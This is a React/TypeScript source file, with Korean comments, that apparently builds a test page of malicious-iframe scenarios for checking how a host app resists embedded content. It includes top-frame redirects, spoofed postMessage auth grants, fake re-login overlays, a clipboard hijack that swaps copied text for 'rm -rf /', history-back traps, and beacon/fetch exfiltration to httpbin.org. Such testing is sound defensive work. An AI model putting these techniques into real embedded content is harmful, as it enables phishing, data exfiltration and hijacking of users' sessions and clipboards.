"use client";

import { useState } from "react";
import { EmbedShell, IEmbedAction } from "./EmbedShell";

type Push = (s: string) => void;

/* ============================================================
 * 시나리오별 임베드 컴포넌트.
 * 각 컴포넌트는 EmbedShell 을 wrap 해서 title + actions + (optional UI).
 * ============================================================ */

const TopRedirect = () => (
  <EmbedShell
    title="top.location 강제 리다이렉트"
    actions={[
      {
        label: "top.location 변경",
        danger: true,
        run: (push) => {
          try {
            window.top!.location.href = "https://example.com/?attacker=1";
            push("호출 완료");
          } catch (e) {
            push(`차단: ${(e as Error).message}`);
          }
        },
      },
      {
        label: "a target=_top click",
        danger: true,
        run: () => {
          const a = document.createElement("a");
          a.href = "https://example.com/?via-anchor=1";
          a.target = "_top";
          document.body.appendChild(a);
          a.click();
          a.remove();
        },
      },
    ]}
  />
);

const PRESET_MSGS: { label: string; data: unknown }[] = [
  { label: "string", data: "hello-attacker" },
  { label: "auth grant", data: { type: "AUTH", token: "FAKE.JWT", role: "admin" } },
  { label: "router push", data: { type: "NAVIGATE", path: "/admin" } },
  { label: "iframe-resizer", data: { type: "iframe-resizer", height: 99999 } },
];

const PostMessage = () => (
  <EmbedShell
    title="postMessage 스푸핑"
    actions={PRESET_MSGS.map<IEmbedAction>((p) => ({
      label: p.label,
      danger: true,
      run: (push) => {
        window.parent.postMessage(p.data, "*");
        push(`sent: ${JSON.stringify(p.data)}`);
      },
    }))}
  />
);

const PhishingForm = () => {
  const [email, setEmail] = useState("");
  const [pw, setPw] = useState("");
  return (
    <EmbedShell
      title="가짜 로그인 폼"
      actions={[
        {
          label: "수집 시뮬레이션",
          danger: true,
          run: (push) =>
            push(
              `email=${email || "(empty)"} pw=${pw ? "*".repeat(pw.length) : "(empty)"}`
            ),
        },
      ]}
    >
      <div className="card">
        <input
          placeholder="email"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          style={{ marginBottom: 6 }}
        />
        <input
          placeholder="password"
          type="password"
          value={pw}
          onChange={(e) => setPw(e.target.value)}
        />
      </div>
    </EmbedShell>
  );
};

const AutoDownload = () => (
  <EmbedShell
    title="자동 다운로드 트리거"
    actions={[
      {
        label: "Blob 다운로드",
        danger: true,
        run: (push) => {
          const b = new Blob(["auto-downloaded payload"], { type: "text/plain" });
          const u = URL.createObjectURL(b);
          const a = document.createElement("a");
          a.href = u;
          a.download = "definitely-not-malware.txt";
          document.body.appendChild(a);
          a.click();
          a.remove();
          URL.revokeObjectURL(u);
          push("Blob 다운로드 트리거됨");
        },
      },
    ]}
  />
);

const PopupSpam = () => (
  <EmbedShell
    title="popup / window.open"
    actions={[
      {
        label: "window.open(self)",
        danger: true,
        run: (push) => {
          const w = window.open(location.href, "_blank");
          push(w ? "열림" : "차단됨");
        },
      },
      {
        label: "window.open(external)",
        danger: true,
        run: (push) => {
          const w = window.open("https://example.com", "_blank");
          push(w ? "열림" : "차단됨");
        },
      },
    ]}
  />
);

const AutoplayMedia = () => (
  <EmbedShell
    title="자동재생 / 풀스크린"
    actions={[
      {
        label: "video play (muted)",
        run: async (push) => {
          const v = document.createElement("video");
          v.src = "https://www.w3schools.com/html/mov_bbb.mp4";
          v.muted = true;
          v.style.width = "100%";
          document.querySelector(".embed-extra")?.appendChild(v);
          try {
            await v.play();
            push("재생 성공");
          } catch (e) {
            push(`차단: ${(e as Error).message}`);
          }
        },
      },
      {
        label: "requestFullscreen",
        danger: true,
        run: async (push) => {
          try {
            await document.documentElement.requestFullscreen();
            push("풀스크린 진입");
          } catch (e) {
            push(`차단: ${(e as Error).message}`);
          }
        },
      },
    ]}
  >
    <div />
  </EmbedShell>
);

const NotificationPermission = () => (
  <EmbedShell
    title="알림 권한 요청"
    actions={[
      {
        label: "requestPermission",
        danger: true,
        run: async (push) => {
          push(`current=${Notification.permission}`);
          const r = await Notification.requestPermission();
          push(`result=${r}`);
        },
      },
    ]}
  />
);

const ClipboardHijack = () => (
  <EmbedShell
    title="클립보드 hijack"
    actions={[
      {
        label: "copy 이벤트 가로채기 활성화",
        danger: true,
        run: (push) => {
          document.addEventListener(
            "copy",
            (e) => {
              e.preventDefault();
              const evil = "rm -rf / ← clipboard hijacked";
              (e as ClipboardEvent).clipboardData?.setData("text/plain", evil);
              push(`hijack: 덮어쓴 값="${evil}"`);
            },
            { once: false }
          );
          push("후크 설치 완료. 아래 텍스트를 복사해보세요.");
        },
      },
      {
        label: "writeText 시도",
        danger: true,
        run: async (push) => {
          try {
            await navigator.clipboard.writeText("hijacked by iframe");
            push("writeText 성공");
          } catch (e) {
            push(`차단: ${(e as Error).message}`);
          }
        },
      },
    ]}
  >
    <div className="card">아무 텍스트나 선택해서 복사해 보세요. 이 줄을 시도해 보세요.</div>
  </EmbedShell>
);

const FullscreenOverlay = () => {
  const [show, setShow] = useState(false);
  return (
    <EmbedShell
      title="풀스크린 오버레이 위장"
      actions={[
        {
          label: "오버레이 표시",
          danger: true,
          run: () => setShow(true),
        },
        {
          label: "오버레이 닫기",
          run: () => setShow(false),
        },
      ]}
    >
      {show && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            background: "#fff",
            color: "#111",
            zIndex: 99999,
            padding: 24,
            fontFamily: "system-ui",
          }}
        >
          <h2 style={{ marginTop: 0, color: "#111" }}>Example Workspace — 재로그인</h2>
          <p style={{ color: "#555" }}>(PoC 가짜 화면)</p>
          <input placeholder="email" style={{ display: "block", margin: "6px 0", padding: 8, width: 260 }} />
          <input placeholder="password" type="password" style={{ display: "block", margin: "6px 0", padding: 8, width: 260 }} />
          <button onClick={() => setShow(false)} style={{ marginTop: 8 }}>
            (닫기)
          </button>
        </div>
      )}
    </EmbedShell>
  );
};

const HistoryPollution = () => (
  <EmbedShell
    title="history.pushState 오염"
    actions={[
      {
        label: "10번 pushState",
        danger: true,
        run: (push) => {
          for (let i = 0; i < 10; i++)
            history.pushState({}, "", `?pol=${Date.now()}-${i}`);
          push("history 10개 오염됨");
        },
      },
      {
        label: "뒤로가기 트랩",
        danger: true,
        run: (push) => {
          window.addEventListener("popstate", () => {
            history.pushState({}, "", "?trap=" + Date.now());
          });
          push("popstate 트랩 설치");
        },
      },
    ]}
  />
);

const SopProbe = () => (
  <EmbedShell
    title="SOP probe — 안 되는 것 확인"
    actions={[
      {
        label: "parent.document",
        run: (push) => {
          try {
            const h = window.parent.document.documentElement.outerHTML;
            push(`성공: ${h.slice(0, 60)}...`);
          } catch (e) {
            push(`차단: ${(e as Error).message}`);
          }
        },
      },
      {
        label: "parent.location.href",
        run: (push) => {
          try {
            push(`성공: ${window.parent.location.href}`);
          } catch (e) {
            push(`차단: ${(e as Error).message}`);
          }
        },
      },
      {
        label: "parent.localStorage",
        run: (push) => {
          try {
            const k = Object.keys(window.parent.localStorage);
            push(`성공: ${JSON.stringify(k)}`);
          } catch (e) {
            push(`차단: ${(e as Error).message}`);
          }
        },
      },
    ]}
  />
);

const FormAutoSubmit = () => (
  <EmbedShell
    title="form 자동 submit"
    actions={[
      {
        label: "POST 외부",
        danger: true,
        run: (push) => {
          const f = document.createElement("form");
          f.method = "POST";
          f.action = "https://httpbin.org/post";
          f.target = "_blank";
          const i = document.createElement("input");
          i.name = "stolen";
          i.value = "from-iframe";
          f.appendChild(i);
          document.body.appendChild(f);
          f.submit();
          f.remove();
          push("form submit 호출됨");
        },
      },
    ]}
  />
);

const BeaconExfil = () => (
  <EmbedShell
    title="beacon / fetch exfiltration"
    actions={[
      {
        label: "sendBeacon",
        danger: true,
        run: (push) => {
          const ok = navigator.sendBeacon(
            "https://httpbin.org/post",
            new Blob(
              [
                JSON.stringify({
                  referrer: document.referrer,
                  ua: navigator.userAgent,
                }),
              ],
              { type: "application/json" }
            )
          );
          push(`sendBeacon=${ok}`);
        },
      },
      {
        label: "fetch POST",
        danger: true,
        run: async (push) => {
          try {
            const r = await fetch("https://httpbin.org/post", {
              method: "POST",
              mode: "cors",
              body: JSON.stringify({ referrer: document.referrer }),
            });
            push(`status=${r.status}`);
          } catch (e) {
            push(`실패: ${(e as Error).message}`);
          }
        },
      },
    ]}
  />
);

const CsrfImage = () => (
  <EmbedShell
    title="img GET CSRF"
    actions={[
      {
        label: "img.src 발사",
        danger: true,
        run: (push) => {
          const img = document.createElement("img");
          img.src = `https://httpbin.org/image/png?fired=${Date.now()}`;
          img.alt = "";
          img.style.maxWidth = "180px";
          img.style.display = "block";
          img.onload = () => push("img onload");
          img.onerror = () => push("img onerror");
          document.querySelector(".embed-extra")?.appendChild(img);
          push("img 추가됨");
        },
      },
    ]}
  >
    <div />
  </EmbedShell>
);

const TokenExfil = () => (
  <EmbedShell
    title="부모 토큰 / 네트워크 탈취 시도"
    actions={[
      {
        label: "전체 자동",
        danger: true,
        run: (push) => {
          push(`referrer=${document.referrer || "(empty)"}`);
          const ao = (location as Location & { ancestorOrigins?: DOMStringList })
            .ancestorOrigins;
          push(`ancestorOrigins=${JSON.stringify(ao ? Array.from(ao) : null)}`);
          [
            { type: "GET_TOKEN" },
            { type: "GET_AUTH_TOKEN" },
            { type: "AUTH_REQUEST" },
            "GET_TOKEN",
          ].forEach((p, i) =>
            setTimeout(() => {
              window.parent.postMessage(p, "*");
              push(`sent: ${JSON.stringify(p)}`);
            }, i * 250)
          );
          setTimeout(() => {
            try {
              Object.keys(window.parent.localStorage);
              push("parent.localStorage 성공(?!)");
            } catch (e) {
              push(`parent.localStorage 차단: ${(e as Error).message}`);
            }
          }, 1500);
        },
      },
      {
        label: "내 storage 키",
        run: (push) =>
          push(`local=${JSON.stringify(Object.keys(localStorage))}`),
      },
    ]}
  />
);

const ParentListenerProbe = () => {
  const PAYLOADS = [
    "ping",
    { type: "AUTH_GRANT", token: "FAKE.JWT.xxx" },
    { type: "ROUTER_PUSH", url: "/admin" },
    { type: "SHOW_TOAST", text: "Click here to relogin" },
    '{"event":"command","func":"playVideo","args":""}',
  ];
  return (
    <EmbedShell
      title="parent message listener probe"
      actions={[
        {
          label: "전체 순차 발사",
          danger: true,
          run: (push) => {
            PAYLOADS.forEach((p, i) =>
              setTimeout(() => {
                window.parent.postMessage(p, "*");
                push(`sent: ${JSON.stringify(p).slice(0, 80)}`);
              }, i * 250)
            );
          },
        },
      ]}
    />
  );
};

const DelayedAttack = () => (
  <EmbedShell
    title="지연 / 자동 실행"
    actions={[
      {
        label: "top.location (즉시)",
        danger: true,
        run: (push) => {
          try {
            window.top!.location.href = "https://example.com/?delayed";
          } catch (e) {
            push(`차단: ${(e as Error).message}`);
          }
        },
      },
      {
        label: "postMessage AUTH",
        danger: true,
        run: (push) => {
          window.parent.postMessage(
            { type: "AUTH", token: "FAKE" },
            "*"
          );
          push("sent");
        },
      },
    ]}
  />
);

const ChainedAttack = () => {
  const [step, setStep] = useState<"idle" | "overlay" | "done">("idle");
  return (
    <EmbedShell
      title="체인 공격 — 풀스크린 + 피싱 + redirect"
      actions={[
        {
          label: "체인 시작",
          danger: true,
          run: (push) => {
            push("[1/3] 오버레이");
            setStep("overlay");
          },
        },
        {
          label: "리셋",
          run: () => setStep("idle"),
        },
      ]}
    >
      {step === "overlay" && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            background: "#fff",
            color: "#111",
            zIndex: 99999,
            padding: 24,
          }}
        >
          <h2 style={{ marginTop: 0, color: "#111" }}>Example Workspace — 재로그인 필요</h2>
          <form
            onSubmit={(e) => {
              e.preventDefault();
              setStep("done");
              try {
                window.top!.location.href =
                  document.referrer || "https://example.com";
              } catch {}
            }}
          >
            <input placeholder="email" style={{ display: "block", margin: "6px 0", padding: 8, width: 260 }} />
            <input placeholder="password" type="password" style={{ display: "block", margin: "6px 0", padding: 8, width: 260 }} />
            <button type="submit" style={{ marginTop: 6 }}>로그인</button>
          </form>
        </div>
      )}
    </EmbedShell>
  );
};

export const SCENARIO_EMBEDS: Record<string, React.FC> = {
  "top-redirect": TopRedirect,
  "post-message": PostMessage,
  "phishing-form": PhishingForm,
  "auto-download": AutoDownload,
  "popup-spam": PopupSpam,
  "autoplay-media": AutoplayMedia,
  "notification-permission": NotificationPermission,
  "clipboard-hijack": ClipboardHijack,
  "fullscreen-overlay": FullscreenOverlay,
  "history-pollution": HistoryPollution,
  "sop-probe": SopProbe,
  "form-auto-submit": FormAutoSubmit,
  "beacon-exfil": BeaconExfil,
  "csrf-image": CsrfImage,
  "token-exfil": TokenExfil,
  "parent-message-listener-probe": ParentListenerProbe,
  "delayed-attack": DelayedAttack,
  "chained-attack": ChainedAttack,
};
